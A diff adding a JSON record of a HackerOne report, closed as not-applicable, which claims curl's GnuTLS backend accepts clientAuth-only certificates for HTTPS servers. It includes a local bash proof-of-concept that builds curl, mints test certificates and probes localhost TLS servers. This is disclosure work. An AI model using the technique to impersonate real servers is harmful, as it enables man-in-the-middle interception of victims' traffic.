@@ -1,0 +1,111 @@
+{
+  "id": 3752567,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzUyNTY3",
+  "url": "https://hackerone.com/reports/3752567",
+  "title": "curl GnuTLS backend accepts a clientAuth-only certificate for HTTPS server authentication",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2026-05-21T07:04:58.618Z",
+  "submitted_at": "2026-05-21T07:05:00.392Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jingzhou",
+    "url": "/jingzhou",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-25T21:06:22.803Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-05-21T09:16:32.324Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen curl/libcurl is built with the GnuTLS backend, the current HTTPS server-certificate validation path verifies the trust chain and hostname but does not enforce TLS server Extended Key Usage semantics. As a result, a leaf certificate that chains to a trusted CA, matches the requested hostname, and explicitly allows only `clientAuth` can still be accepted as an HTTPS server certificate. This lets an attacker who has a wrong-purpose but trusted certificate and private key impersonate an HTTPS server to affected clients, even though a correct client should reject that certificate for server authentication. The issue is not a caller-misuse or invalid-input crash: it is a runtime authentication gap in curl's GnuTLS integration. The inline PoC below self-builds the current source tree with GnuTLS and demonstrates that a valid `serverAuth` certificate succeeds, a `clientAuth`-only certificate incorrectly also succeeds, and a separate key-usage-only invalid control certificate is rejected.\n\n## Affected version\nValidated locally on current `master` / `HEAD`:\n\n`d24652971a636a4b2374367434ed72bb561b79bc`\n\nThe self-built probe from the current tree reports:\n\n`libcurl/8.21.0-DEV GnuTLS/3.8.3 libidn2/2.3.7 libpsl/0.21.2`\n\nPlatform used for validation:\n\n`Linux x86_64 (Ubuntu-based environment)`\n\nI validated the issue against the current source tree. I have not yet finished a full historical bisection for the original introduction point, so the report should be treated as confirmed on current master at minimum.\n\n## Source-level explanation\nThe current source code shows why this happens.\n\nFirst, the GnuTLS backend initializes trust verification flags, but it does not\nconfigure any TLS server EKU requirement:\n\n```c\ngnutls_certificate_set_verify_flags(creds,\n                                    GNUTLS_VERIFY_ALLOW_X509_V1_CA_CRT);\n```\n\nThen `gtls_verify_cert()` in `lib/vtls/gtls.c` makes the trust decision from\n`gnutls_certificate_verify_peers2()` and treats \"not marked invalid\" as a\nsuccessful certificate verification:\n\n```c\nint rc = gnutls_certificate_verify_peers2(session, &verify_status);\n...\nverified = !(verify_status & GNUTLS_CERT_INVALID);\nif(verified)\n  infof(data, \"  SSL certificate verified by GnuTLS\");\n```\n\nLater, `Curl_gtls_verifyserver()` imports the leaf certificate and performs a\nseparate hostname check:\n\n```c\nrc = (int)gnutls_x509_crt_check_hostname(x509_cert,\n                                         peer->sni ? peer->sni :\n                                         peer->dest->hostname);\nresult = (!rc && config->verifyhost) ?\n  CURLE_PEER_FAILED_VERIFICATION : CURLE_OK;\n```\n\nThat means the current curl validation flow is effectively:\n\n1. trust chain check\n2. time validity check\n3. hostname check\n\nWhat is missing is the server-purpose check on the end-entity certificate.\nThere is no equivalent of:\n\n```c\ngnutls_x509_crt_check_key_purpose(x509_cert,\n                                  GNUTLS_KP_TLS_WWW_SERVER, 0);\n```\n\nor a switch to the GnuTLS verification API that enforces end-certificate\npurpose.\n\nSo if the attacker presents a certificate that:\n\n- chains to a trusted CA\n- matches the requested hostname\n- has an EKU extension that contains only `clientAuth`\n\nthe current curl code still reaches the \"verified\" path because it never adds\nthe missing \"must be valid for TLS WWW server authentication\" decision step.\n\n## Steps To Reproduce:\nFrom the repository root, run the following self-contained script. It does not depend on any local PoC file. It exports a clean tracked-source snapshot with `git archive`, downloads GnuTLS development packages into a temporary user-local SDK, builds the current source tree with the GnuTLS backend only, generates a local CA plus three test leaf certificates, starts real TLS servers, and then uses a tiny current-source libcurl probe with certificate verification enabled to connect to each case.\n\n```bash\nset -euo pipefail\n\nREPO_ROOT=\"$PWD\"\nif [ ! -d \"$REPO_ROOT/.git\" ]; then\n  echo \"run this from the curl git repository root\" >&2\n  exit 1\nfi\n\nfor cmd in apt-get awk cc cmake dpkg-deb getconf git ldconfig openssl sed ss tar; do\n  command -v \"$cmd\" >/dev/null 2>&1 || {\n    echo \"missing required command: $cmd\" >&2\n    exit 1\n  }\ndone\n\nfind_so() {\n  local soname=\"$1\"\n  local path\n  path=\"$(\n    ldconfig -p | awk -v so=\"$soname\" '\n      $1 == so && $0 ~ /x86-64/ { print $NF; found=1; exit }\n      $1 == so && !fallback { fallback=$NF }\n      END {\n        if(!found && fallback)\n          print fallback\n      }'\n  )\"\n  [ -n \"$path\" ] || {\n    echo \"unable to locate shared library: $soname\" >&2\n    exit 1\n  }\n  printf '%s\\n' \"$path\"\n}\n\nport_free() {\n  ! ss -ltn \"( sport = :$1 )\" | grep -q LISTEN\n}\n\npick_port_base() {\n  local base\n  for base in 29443 29446 29449 29452 29455; do\n    if port_free \"$base\" && port_free \"$((base + 1))\" && port_free \"$((base + 2))\"; then\n      printf '%s\\n' \"$base\"\n      return\n    fi\n  done\n  echo \"unable to find three consecutive free TCP ports\" >&2\n  exit 1\n}\n\nWORKDIR=\"$(mktemp -d \"${TMPDIR:-/tmp}/curl-gnutls-eku-XXXXXX\")\"\ntrap 'jobs -p | xargs -r kill 2>/dev/null || true; echo \"[*] workdir kept at: $WORKDIR\"' EXIT\nDEBS_DIR=\"$WORKDIR/debs\"\nSDK_ROOT=\"$WORKDIR/sdk\"\nSRC_ROOT=\"$WORKDIR/src\"\nBUILD_ROOT=\"$WORKDIR/build\"\nCERT_ROOT=\"$WORKDIR/certs\"\nPROBE_C=\"$WORKDIR/libcurl_eku_probe.c\"\nPROBE_BIN=\"$WORKDIR/libcurl_eku_probe\"\n\nPORT_BASE=\"$(pick_port_base)\"\nGOOD_PORT=\"$PORT_BASE\"\nBADEKU_PORT=\"$((PORT_BASE + 1))\"\nBADKU_PORT=\"$((PORT_BASE + 2))\"\n\necho \"[*] repo: $REPO_ROOT\"\necho \"[*] commit: $(git -C \"$REPO_ROOT\" rev-parse HEAD)\"\necho \"[*] workdir: $WORKDIR\"\necho \"[*] ports: good=$GOOD_PORT badeku=$BADEKU_PORT badku=$BADKU_PORT\"\n\nmkdir -p \"$DEBS_DIR\" \"$SDK_ROOT\" \"$SRC_ROOT\" \"$BUILD_ROOT\" \"$CERT_ROOT\"\n\necho \"[*] downloading user-local build dependencies\"\n(\n  cd \"$DEBS_DIR\"\n  apt-get download \\\n    libgnutls28-dev \\\n    nettle-dev \\\n    libidn2-dev \\\n    libtasn1-6-dev \\\n    libunistring-dev \\\n    libp11-kit-dev \\\n    libnghttp2-dev >/dev/null\n)\n\necho \"[*] extracting development packages\"\nfor deb in \"$DEBS_DIR\"/*.deb; do\n  dpkg-deb -x \"$deb\" \"$SDK_ROOT\"\ndone\n\necho \"[*] exporting a clean tracked-source snapshot\"\ngit -C \"$REPO_ROOT\" archive --format=tar HEAD | tar -xf - -C \"$SRC_ROOT\"\n\necho \"[*] configuring a current-source GnuTLS build\"\nPKG_CONFIG_PATH=\"$SDK_ROOT/usr/lib/x86_64-linux-gnu/pkgconfig:$SDK_ROOT/usr/lib/pkgconfig\" \\\nPKG_CONFIG_SYSROOT_DIR=\"$SDK_ROOT\" \\\ncmake -S \"$SRC_ROOT\" -B \"$BUILD_ROOT\" \\\n  -DCURL_USE_GNUTLS=ON \\\n  -DCURL_USE_OPENSSL=OFF \\\n  -DBUILD_SHARED_LIBS=OFF \\\n  -DBUILD_STATIC_LIBS=ON \\\n  -DBUILD_TESTING=OFF \\\n  -DBUILD_LIBCURL_DOCS=OFF \\\n  -DBUILD_MISC_DOCS=OFF \\\n  -DCURL_ZLIB=OFF \\\n  -DCURL_BROTLI=OFF \\\n  -DCURL_ZSTD=OFF \\\n  -DUSE_NGHTTP2=OFF >/dev/null\n\necho \"[*] building libcurl.a\"\ncmake --build \"$BUILD_ROOT\" --target libcurl_static \\\n  -j\"$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 4)\" >/dev/null\n\ncat >\"$PROBE_C\" <<'EOF'\n#include <stdio.h>\n#include <curl/curl.h>\n\nstatic size_t sink(char *ptr, size_t size, size_t nmemb, void *userdata)\n{\n  (void)ptr;\n  (void)userdata;\n  return size * nmemb;\n}\n\nint main(int argc, char **argv)\n{\n  CURL *h;\n  CURLcode rc;\n\n  if(argc != 3) {\n    fprintf(stderr, \"usage: %s <url> <cacert>\\n\", argv[0]);\n    return 2;\n  }\n\n  printf(\"version=%s\\n\", curl_version());\n\n  rc = curl_global_init(CURL_GLOBAL_DEFAULT);\n  if(rc) {\n    fprintf(stderr, \"curl_global_init=%d\\n\", (int)rc);\n    return 3;\n  }\n\n  h = curl_easy_init();\n  if(!h) {\n    fprintf(stderr, \"curl_easy_init failed\\n\");\n    curl_global_cleanup();\n    return 4;\n  }\n\n  curl_easy_setopt(h, CURLOPT_URL, argv[1]);\n  curl_easy_setopt(h, CURLOPT_CAINFO, argv[2]);\n  curl_easy_setopt(h, CURLOPT_VERBOSE, 1L);\n  curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, sink);\n\n  rc = curl_easy_perform(h);\n  fprintf(stderr, \"curl_easy_perform=%d (%s)\\n\",\n          (int)rc, curl_easy_strerror(rc));\n\n  curl_easy_cleanup(h);\n  curl_global_cleanup();\n  return (int)rc;\n}\nEOF\n\necho \"[*] linking the minimal current-source libcurl probe\"\ncc \\\n  -I\"$SRC_ROOT/include\" \\\n  -I\"$BUILD_ROOT/lib\" \\\n  \"$PROBE_C\" \\\n  \"$BUILD_ROOT/lib/libcurl.a\" \\\n  \"$(find_so libgnutls.so.30)\" \\\n  \"$(find_so libnghttp2.so.14)\" \\\n  \"$(find_so libpsl.so.5)\" \\\n  \"$(find_so libidn2.so.0)\" \\\n  \"$(find_so libunistring.so.5)\" \\\n  \"$(find_so libnettle.so.8)\" \\\n  \"$(find_so libhogweed.so.6)\" \\\n  \"$(find_so libgmp.so.10)\" \\\n  \"$(find_so libtasn1.so.6)\" \\\n  \"$(find_so libp11-kit.so.0)\" \\\n  \"$(find_so libffi.so.8)\" \\\n  \"$(find_so libz.so)\" \\\n  \"$(find_so libbrotlidec.so)\" \\\n  \"$(find_so libzstd.so)\" \\\n  \"$(find_so libatomic.so.1)\" \\\n  -lpthread \\\n  -o \"$PROBE_BIN\"\n\ncat >\"$CERT_ROOT/ca.cnf\" <<'EOF'\n[req]\ndistinguished_name = dn\nx509_extensions = v3_ca\nprompt = no\n\n[dn]\nCN = eku-test-ca\n\n[v3_ca]\nsubjectKeyIdentifier = hash\nauthorityKeyIdentifier = keyid:always,issuer\nbasicConstraints = critical, CA:true\nkeyUsage = critical, keyCertSign, cRLSign\nEOF\n\ncat >\"$CERT_ROOT/server-good.cnf\" <<'EOF'\n[req]\ndistinguished_name = dn\nreq_extensions = v3_req\nprompt = no\n\n[dn]\nCN = localhost\n\n[v3_req]\nsubjectAltName = @alt_names\nbasicConstraints = critical, CA:false\nkeyUsage = critical, digitalSignature, keyEncipherment\nextendedKeyUsage = critical, serverAuth\n\n[alt_names]\nDNS.1 = localhost\nEOF\n\ncat >\"$CERT_ROOT/server-badeku.cnf\" <<'EOF'\n[req]\ndistinguished_name = dn\nreq_extensions = v3_req\nprompt = no\n\n[dn]\nCN = localhost\n\n[v3_req]\nsubjectAltName = @alt_names\nbasicConstraints = critical, CA:false\nkeyUsage = critical, digitalSignature, keyEncipherment\nextendedKeyUsage = critical, clientAuth\n\n[alt_names]\nDNS.1 = localhost\nEOF\n\ncat >\"$CERT_ROOT/server-badku.cnf\" <<'EOF'\n[req]\ndistinguished_name = dn\nreq_extensions = v3_req\nprompt = no\n\n[dn]\nCN = localhost\n\n[v3_req]\nsubjectAltName = @alt_names\nbasicConstraints = critical, CA:false\nkeyUsage = critical, keyCertSign, cRLSign\nextendedKeyUsage = critical, serverAuth\n\n[alt_names]\nDNS.1 = localhost\nEOF\n\necho \"[*] generating CA\"\nopenssl req -x509 -newkey rsa:2048 -nodes -days 365 \\\n  -keyout \"$CERT_ROOT/ca.key\" \\\n  -out \"$CERT_ROOT/ca.crt\" \\\n  -config \"$CERT_ROOT/ca.cnf\" >/dev/null 2>&1\n\ngen_leaf() {\n  local name=\"$1\"\n  openssl req -newkey rsa:2048 -nodes \\\n    -keyout \"$CERT_ROOT/$name.key\" \\\n    -out \"$CERT_ROOT/$name.csr\" \\\n    -config \"$CERT_ROOT/$name.cnf\" >/dev/null 2>&1\n  openssl x509 -req \\\n    -in \"$CERT_ROOT/$name.csr\" \\\n    -CA \"$CERT_ROOT/ca.crt\" \\\n    -CAkey \"$CERT_ROOT/ca.key\" \\\n    -CAcreateserial \\\n    -days 365 \\\n    -out \"$CERT_ROOT/$name.crt\" \\\n    -extfile \"$CERT_ROOT/$name.cnf\" \\\n    -extensions v3_req >/dev/null 2>&1\n}\n\necho \"[*] generating leaf certificates\"\ngen_leaf server-good\ngen_leaf server-badeku\ngen_leaf server-badku\n\necho \"[*] bad EKU leaf:\"\nopenssl x509 -in \"$CERT_ROOT/server-badeku.crt\" -noout -text | \\\n  sed -n '/X509v3 Extended Key Usage/,+2p'\n\necho \"[*] bad KU leaf:\"\nopenssl x509 -in \"$CERT_ROOT/server-badku.crt\" -noout -text | \\\n  sed -n '/X509v3 Key Usage/,+4p'\n\nSERVER_PID=\"\"\nstop_server() {\n  if [ -n \"${SERVER_PID:-}\" ]; then\n    kill \"$SERVER_PID\" >/dev/null 2>&1 || true\n    wait \"$SERVER_PID\" 2>/dev/null || true\n    SERVER_PID=\"\"\n  fi\n}\n\nstart_server() {\n  stop_server\n  openssl s_server \\\n    -accept \"$1\" \\\n    -cert \"$2\" \\\n    -key \"$3\" \\\n    -www >\"$WORKDIR/s_server-$1.log\" 2>&1 &\n  SERVER_PID=\"$!\"\n  sleep 1\n  kill -0 \"$SERVER_PID\" >/dev/null 2>&1 || {\n    echo \"s_server failed on port $1\" >&2\n    sed -n '1,120p' \"$WORKDIR/s_server-$1.log\" >&2 || true\n    exit 1\n  }\n}\n\nrun_case() {\n  local label=\"$1\"\n  local port=\"$2\"\n  set +e\n  \"$PROBE_BIN\" \"https://localhost:$port/\" \"$CERT_ROOT/ca.crt\" \\\n    >\"$WORKDIR/$label.stdout\" \\\n    2>\"$WORKDIR/$label.stderr\"\n  rc=\"$?\"\n  set -e\n  echo \"[*] $label stdout\"\n  sed -n '1,80p' \"$WORKDIR/$label.stdout\"\n  echo \"[*] $label stderr\"\n  sed -n '1,160p' \"$WORKDIR/$label.stderr\"\n  printf '%s\\n' \"$rc\"\n}\n\nstart_server \"$GOOD_PORT\" \"$CERT_ROOT/server-good.crt\" \"$CERT_ROOT/server-good.key\"\nGOOD_RC=\"$(run_case good \"$GOOD_PORT\" | tail -n1)\"\n\nstart_server \"$BADEKU_PORT\" \"$CERT_ROOT/server-badeku.crt\" \"$CERT_ROOT/server-badeku.key\"\nBADEKU_RC=\"$(run_case badeku \"$BADEKU_PORT\" | tail -n1)\"\n\nstart_server \"$BADKU_PORT\" \"$CERT_ROOT/server-badku.crt\" \"$CERT_ROOT/server-badku.key\"\nBADKU_RC=\"$(run_case badku \"$BADKU_PORT\" | tail -n1)\"\n\nstop_server\n\necho \"[*] result summary: good=$GOOD_RC badeku=$BADEKU_RC badku=$BADKU_RC\"\nif [ \"$GOOD_RC\" -eq 0 ] && [ \"$BADEKU_RC\" -eq 0 ] && [ \"$BADKU_RC\" -ne 0 ]; then\n  echo\n  echo \"[+] VULNERABLE: current-source libcurl built with GnuTLS accepted a clientAuth-only server certificate.\"\n  echo \"[+] Scope note: the KU-only invalid control certificate was rejected, so this reproduces an EKU bypass.\"\nelse\n  echo\n  echo \"[-] NOT REPRODUCED\" >&2\n  exit 1\nfi\n```\n\nExpected secure behavior:\n\n- `good` should succeed\n- `badeku` should fail because a certificate whose EKU is only `clientAuth`\n  must not be accepted for HTTPS server authentication\n- `badku` should fail as an invalid control case\n\nObserved vulnerable behavior on current `HEAD`:\n\n- `good` succeeds with `curl_easy_perform=0`\n- `badeku` also succeeds with `curl_easy_perform=0`\n- `badku` fails with `curl_easy_perform=35`\n- the probe logs `SSL certificate verified by GnuTLS` in the vulnerable\n  `badeku` case\n\nRelevant code path in the current tree:\n\n- `lib/vtls/gtls.c`: `gtls_verify_cert()` relies on\n  `gnutls_certificate_verify_peers2()`\n- `lib/vtls/gtls.c`: hostname verification is then done separately with\n  `gnutls_x509_crt_check_hostname()`\n- no equivalent TLS server purpose enforcement is performed on the leaf\n  certificate before the connection is accepted\n\nWhy this is not just “the attacker already has a certificate, so who cares”:\n\n- the attacker does not need a proper HTTPS server certificate\n- the attacker only needs a trusted certificate and key that should be limited\n  to client authentication\n- without this bug, a correct HTTPS client would reject that wrong-purpose\n  certificate for server impersonation\n- with this bug, affected curl/libcurl clients upgrade that lower-privilege\n  credential into a working server-authentication credential\n\n## Impact\n\n## Summary:\nAn attacker who can obtain a hostname-matching certificate and private key that chain to a CA trusted by the victim, but whose EKU is limited to `clientAuth`, can impersonate an HTTPS server to affected curl/libcurl clients built with GnuTLS. This breaks the intended security boundary enforced by EKU: a credential that should only authenticate a client, user, or device can be repurposed as a server identity. The most realistic scenarios are internal or enterprise PKIs that issue both client and service certificates under a trusted CA, mis-issuance where a target-host certificate is created with only `clientAuth`, or compromise of a client-certificate private key that should not be usable for HTTPS server impersonation. In those cases, a man-in-the-middle or traffic-redirection attacker can present the wrong-purpose certificate during the TLS handshake and still get a successful HTTPS connection from affected curl/libcurl clients. The result is a real certificate-authentication bypass and HTTPS server impersonation against clients that believe certificate verification is fully enabled.",
+  "weakness": {
+    "id": 28,
+    "name": "Improper Certificate Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
